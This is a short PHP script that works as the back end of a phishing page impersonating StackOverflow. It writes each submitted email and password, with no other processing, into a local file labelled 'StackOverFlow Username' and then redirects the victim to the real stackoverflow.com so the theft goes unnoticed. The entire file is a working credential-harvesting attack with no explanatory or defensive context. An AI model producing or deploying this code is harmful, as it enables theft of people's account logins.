<?php 
file_put_contents("usernames.txt", "StackOverFlow Username: " . $_POST['email'] . " Pass: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://stackoverflow.com/');
exit();
?>
